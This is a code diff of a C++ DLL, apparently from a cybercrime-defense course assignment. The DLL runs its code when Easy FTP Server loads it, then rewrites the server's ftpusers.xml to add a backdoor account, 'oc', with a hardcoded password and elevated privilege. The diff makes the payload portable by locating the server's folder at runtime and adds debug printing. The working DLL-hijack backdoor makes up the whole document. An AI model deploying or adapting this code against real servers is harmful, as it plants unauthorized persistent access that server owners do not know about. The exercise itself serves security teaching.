@@ -6,9 +6,19 @@
 //In a lot of scenarios you usually have to declare some functions of the actual dll for the system to actually accept
 //it as the real thing, but I seem to be lucky here since it do run my code when the server runs :)
 
+std::string GetExecutablePath()
+{
+    char buffer[MAX_PATH];
+    GetModuleFileNameA(NULL, buffer, MAX_PATH); //gets full path to exe
+    std::string fullPath(buffer);
+    size_t lastSlash = fullPath.find_last_of("\\/");
+
+    return fullPath.substr(0, lastSlash); //folder containing exe
+}
+
 void AppendUser(std::string folderPath)
 {
-    std::ifstream readUsers(folderPath + "ftpusers.xml");
+    std::ifstream readUsers(folderPath + "/ftpusers.xml");
     std::string fileContent = "";
     std::string line = "";
 
@@ -16,6 +26,8 @@ void AppendUser(std::string folderPath)
     {
         fileContent.append(line + '\n');
     }
+
+    std::cout << fileContent << std::endl;
 
     readUsers.close();
     int insertIndex = fileContent.find('\n');
@@ -30,7 +42,7 @@ void AppendUser(std::string folderPath)
             std::string password = "?CheeseHandler55";
             std::string alias = "oc";
             std::string privilege = "131074";
-            std::string work_dir = "C:\\Users\\gabri\\MinaFiler\\CyberCrimeDefense\\Assignment1\\easyftpsvr-1.7.0.2\\OscarCarlson";
+            std::string work_dir = folderPath + "/OscarCarlson";
             std::string welcome_msg = "Hi there!";
             std::string disabled = "no";
 
@@ -41,7 +53,9 @@ void AppendUser(std::string folderPath)
                 "\" disabled=\"" + disabled + "\" />" + "\n");
             fileContent.insert(insertIndex, userEntry);
 
-            std::ofstream writeUsers(folderPath + "ftpusers.xml");
+            std::cout << fileContent << std::endl;
+
+            std::ofstream writeUsers(folderPath + "/ftpusers.xml");
             writeUsers << fileContent;
             writeUsers.close();
         }
@@ -50,7 +64,7 @@ void AppendUser(std::string folderPath)
 
 bool WINAPI DllMain(HANDLE hDLL, DWORD dwReason, LPVOID lpReserved)
 {
-    std::string folderPath = "C:\\Users\\gabri\\MinaFiler\\CyberCrimeDefense\\Assignment1\\easyftpsvr-1.7.0.2\\";
+    std::string folderPath = GetExecutablePath();
 
     switch(dwReason)
     {
